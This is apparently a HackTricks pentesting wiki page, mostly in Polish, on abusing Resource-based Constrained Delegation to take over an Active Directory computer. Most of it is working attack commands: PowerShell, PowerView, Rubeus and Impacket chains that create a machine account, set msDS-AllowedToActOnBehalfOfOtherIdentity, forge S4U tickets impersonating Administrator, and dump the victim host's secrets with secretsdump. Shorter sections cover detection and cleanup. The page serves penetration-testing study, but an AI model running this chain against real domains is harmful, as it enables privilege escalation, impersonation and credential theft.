# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Basics of Resource-based Constrained Delegation

To jest podobne do podstawowego [Constrained Delegation](constrained-delegation.md), ale **zamiast** nadawania uprawnień **obiektowi** do **impersonate any user against a machine**, Resource-based Constrain Delegation **ustawia** w **obiekcie, kto może impersonate any user against it**.

W tym przypadku ograniczony obiekt będzie miał atrybut o nazwie _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ zawierający nazwę użytkownika, który może impersonate any other user against it.

Kolejną ważną różnicą w stosunku do tej formy Constrained Delegation i innych delegacji jest to, że każdy użytkownik z **write permissions over a machine account** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) może ustawić **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (W innych formach Delegation wymagana była rola domain admin).

### New Concepts

W przypadku Constrained Delegation mówiono, że flaga **`TrustedToAuthForDelegation`** wewnątrz wartości _userAccountControl_ użytkownika jest potrzebna, aby wykonać **S4U2Self.** Jednak to nie do końca prawda.\
Rzeczywistość jest taka, że nawet bez tej wartości możesz wykonać **S4U2Self** przeciwko dowolnemu użytkownikowi jeśli jesteś **service** (masz SPN), ale jeśli **masz `TrustedToAuthForDelegation`** zwrócony TGS będzie **Forwardable**, a jeśli tej flagi **nie masz** zwrócony TGS **nie będzie** **Forwardable**.

Jednak jeśli **TGS** użyty w **S4U2Proxy** **NIE jest Forwardable**, próba nadużycia **basic Constrain Delegation** **nie zadziała**. Ale jeśli próbujesz wykorzystać **Resource-Based constrain delegation**, to zadziała.

### Attack structure

> If you have **write equivalent privileges** over a **Computer** account you can obtain **privileged access** in that machine.

Załóżmy, że atakujący już ma **write equivalent privileges over the victim computer**.

1. Atakujący **kompromituje** konto, które ma **SPN** lub **tworzy jedno** („Service A”). Zauważ, że **dowolny** _Admin User_ bez innych specjalnych uprawnień może **utworzyć** do 10 obiektów Computer (**_MachineAccountQuota_**) i ustawić im **SPN**. Tak więc atakujący może po prostu utworzyć obiekt Computer i ustawić SPN.
2. Atakujący **nadużywa swoich WRITE uprawnień** nad komputerem ofiary (ServiceB), aby skonfigurować **resource-based constrained delegation**, pozwalając ServiceA na impersonate any user przeciwko temu komputerowi (ServiceB).
3. Atakujący używa Rubeus, aby wykonać **full S4U attack** (S4U2Self i S4U2Proxy) z Service A do Service B dla użytkownika **z uprzywilejowanym dostępem do Service B**.
1. S4U2Self (z konta ze skompromitowanym/utworzonym SPN): Poproś o **TGS of Administrator to me** (Not Forwardable).
2. S4U2Proxy: Użyj **not Forwardable TGS** z poprzedniego kroku, aby poprosić o **TGS** od **Administrator** do **victim host**.
3. Nawet jeśli używasz not Forwardable TGS, ponieważ wykorzystujesz Resource-based constrained delegation, to zadziała.
4. Atakujący może wykonać **pass-the-ticket** i **podszyć się** pod użytkownika, aby uzyskać **access to the victim ServiceB**.

To check the _**MachineAccountQuota**_ of the domain you can use:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Atak

### Tworzenie obiektu komputera

Możesz utworzyć obiekt komputera w domenie używając **[powermad](https://github.com/Kevin-Robertson/Powermad):**
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Konfigurowanie Resource-based Constrained Delegation

**Korzystanie z modułu PowerShell activedirectory**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Korzystanie z powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Wykonanie pełnego ataku S4U (Windows/Rubeus)

Najpierw stworzyliśmy nowy obiekt Computer z hasłem `123456`, więc potrzebujemy hasha tego hasła:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
To wydrukuje RC4 i AES hashes dla tego konta.\
Teraz można przeprowadzić atak:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Możesz wygenerować bilety dla wielu usług przy jednym żądaniu, używając parametru `/altservice` w Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Zwróć uwagę, że użytkownicy mają atrybut o nazwie "**Cannot be delegated**". Jeśli u użytkownika ten atrybut ma wartość True, nie będziesz w stanie się za niego podszyć. Tę właściwość można zobaczyć w bloodhound.
 
### Narzędzia Linux: kompletny łańcuch RBCD z użyciem Impacket (2024+)

Jeśli operujesz na Linuxie, możesz przeprowadzić cały łańcuch RBCD, używając oficjalnych narzędzi Impacket:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Notes
- Jeśli wymuszane jest LDAP signing/LDAPS, użyj `impacket-rbcd -use-ldaps ...`.
- Preferuj klucze AES; wiele nowoczesnych domen ogranicza RC4. Impacket i Rubeus obsługują przepływy tylko z AES.
- Impacket może przepisać `sname` ("AnySPN") dla niektórych narzędzi, ale w miarę możliwości uzyskaj poprawny SPN (np. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### Dostęp

Ostatnia linia poleceń wykona **pełny atak S4U i wstrzyknie TGS** z Administratora do hosta ofiary w **pamięci**.\
W tym przykładzie poproszono o TGS dla usługi **CIFS** z konta Administrator, więc będziesz mógł uzyskać dostęp do **C$**:
```bash
ls \\victim.domain.local\C$
```
### Nadużywanie różnych biletów usługowych

Dowiedz się o [**dostępnych biletach usługowych tutaj**](silver-ticket.md#available-services).

## Enumeracja, audyt i czyszczenie

### Wyszukiwanie komputerów z skonfigurowanym RBCD

PowerShell (dekodowanie SD w celu rozpoznania SID-ów):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (odczyt lub opróżnienie za pomocą jednego polecenia):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Czyszczenie / reset RBCD

- PowerShell (wyczyść atrybut):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Błędy Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: To znaczy, że Kerberos jest skonfigurowany tak, aby nie używać DES ani RC4 i dostarczasz tylko hash RC4. Podaj Rubeus co najmniej hash AES256 (lub po prostu podaj rc4, aes128 i aes256). Przykład: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KRB_AP_ERR_SKEW`**: Oznacza to, że czas na bieżącym komputerze różni się od czasu na DC i Kerberos nie działa prawidłowo.
- **`preauth_failed`**: Oznacza to, że podana nazwa użytkownika + hashe nie działają do logowania. Możliwe, że zapomniałeś umieścić "$" w nazwie użytkownika przy generowaniu hashy (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: To może oznaczać:
- Użytkownik, którego próbujesz podszyć, nie ma dostępu do żądanej usługi (bo nie możesz się za niego podszyć lub ponieważ nie ma wystarczających uprawnień)
- Żądana usługa nie istnieje (np. prosisz o ticket dla winrm, ale winrm nie działa)
- Utworzony fakecomputer stracił swoje uprawnienia względem podatnego serwera i musisz je przywrócić.
- Nadużywasz klasycznego KCD; pamiętaj, że RBCD działa z nie-forwardowalnymi ticketami S4U2Self, podczas gdy KCD wymaga forwardowalnych.

## Uwagi, relaye i alternatywy

- Możesz też zapisać RBCD SD przez AD Web Services (ADWS), jeśli LDAP jest filtrowany. Zobacz:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Łańcuchy Kerberos relay często kończą się na RBCD, aby osiągnąć lokalny SYSTEM w jednym kroku. Zobacz praktyczne przykłady end-to-end:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Jeśli LDAP signing/channel binding są **wyłączone** i możesz utworzyć konto komputera, narzędzia takie jak **KrbRelayUp** mogą przekierować wymuszone uwierzytelnienie Kerberos do LDAP, ustawić `msDS-AllowedToActOnBehalfOfOtherIdentity` dla Twojego konta komputera na obiekcie docelowego komputera i natychmiast podszyć się pod **Administrator** za pomocą S4U spoza hosta.

## References

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (oficjalne): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Szybka ściągawka dla Linuxa z aktualną składnią: https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)


{{#include ../../banners/hacktricks-training.md}}
